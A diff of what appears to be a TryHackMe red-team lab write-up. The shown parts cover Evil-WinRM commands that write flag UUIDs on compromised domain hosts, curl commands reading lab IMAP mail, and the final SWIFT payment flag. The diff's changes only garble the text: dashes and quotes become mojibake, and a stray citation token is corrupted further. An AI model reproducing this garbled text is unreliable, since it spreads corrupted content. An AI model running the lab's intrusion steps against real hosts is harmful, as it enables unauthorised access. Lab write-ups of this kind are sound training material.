@@ -16381,7 +16383,7 @@ Set-Content C:\Windows\Temp\Triage.txt "3367998e-5fd4-4355-aba6-396e93552db5"
 bash
 
 ```bash
-# Kali — after clicking proceed
+# Kali â€” after clicking proceed
 curl -s "imap://10.200.40.11:143/INBOX;UID=15" --user "$mail_user:$mail_pass"
 ```
 
@@ -16408,13 +16410,13 @@ Same host WORK1, but this one had a small wrinkle. The `C:\Users\Administrator\`
 > UUID: `5485519e-2f5f-4eb5-aa4c-15859f134dc3`
 
 ```powershell
-# Evil-WinRM (WORK1) — create the missing directory first, then write
+# Evil-WinRM (WORK1) â€” create the missing directory first, then write
 New-Item -ItemType Directory -Path C:\Users\Administrator
 Set-Content C:\Users\Administrator\Triage.txt "5485519e-2f5f-4eb5-aa4c-15859f134dc3"
 ```
 
 ```bash
-# Kali — after clicking proceed
+# Kali â€” after clicking proceed
 curl -s "imap://10.200.40.11:143/INBOX;UID=16" --user "$mail_user:$mail_pass"
 ```
 
@@ -16443,7 +16445,7 @@ Set-Content C:\Windows\Temp\Triage.txt "499bd6ab-b4c1-4862-9c5a-39e6c4c2ae1b"
 ```
 
 ```bash
-# Kali — after clicking proceed
+# Kali â€” after clicking proceed
 curl -s "imap://10.200.40.11:143/INBOX;UID=19" --user "$mail_user:$mail_pass"
 ```
 
@@ -16497,7 +16499,7 @@ Now into the BANK domain controller. Access via my BANKDC Chisel pipeline, route
 > UUID: `fda34257-9468-4fa0-af72-4241b6ea6972`
 
 ```powershell
-# Evil-WinRM (BANKDC) — confirmed via hostname
+# Evil-WinRM (BANKDC) â€” confirmed via hostname
 Set-Content C:\Windows\Temp\Triage.txt "fda34257-9468-4fa0-af72-4241b6ea6972"
 ```
 
@@ -16569,7 +16571,7 @@ Final domain flag. UUID written to the Administrator directory on ROOTDC, runnin
 > UUID: `933690e9-90c4-4493-8c1f-43ae47bb0eaf`
 
 ```powershell
-# Evil-WinRM (ROOTDC) — running as MdCoreSvc
+# Evil-WinRM (ROOTDC) â€” running as MdCoreSvc
 Set-Content C:\Users\Administrator\Triage.txt "933690e9-90c4-4493-8c1f-43ae47bb0eaf"
 ```
 
@@ -16695,7 +16697,7 @@ curl -s "imap://10.200.40.11:143/INBOX;UID=29" --user "$mail_user:$mail_pass"
 ---
 Flag 20: SWIFT Payment Made
 
-The final flag required executing the full SWIFT transaction workflow using the three roles involved in the platform’s separation‑of‑duties design: destination verifier, capturer, and approver.
+The final flag required executing the full SWIFT transaction workflow using the three roles involved in the platformâ€™s separationâ€‘ofâ€‘duties design: destination verifier, capturer, and approver.
 
 During my first attempt at this step the transaction workflow completed inside the SWIFT interface but **the Flag 20 completion event did not trigger in the verification console**. Rather than attempting to debug the state of the application further, I chose the quicker operational approach and **reset the SWIFT progress** from the challenge panel and repeated the process cleanly.
 
@@ -16751,7 +16753,7 @@ Two confirmation emails were received indicating successful completion of the ex
 > [!example] The big picture
 > This engagement had a lot of viable routes. That became obvious as I went, because I kept bumping into alternate wins and side leads that would have been completely workable if my primary path had stalled.
 >
-> TryHackMe even calls this out in their own guidance. There is no single path through the network, and different combinations can still get you to the finish. fileciteturn1file0L1-L6
+> TryHackMe even calls this out in their own guidance. There is no single path through the network, and different combinations can still get you to the finish. îˆ€fileciteîˆ‚turn1file0îˆ‚L1-L6îˆ
 
 ---
 
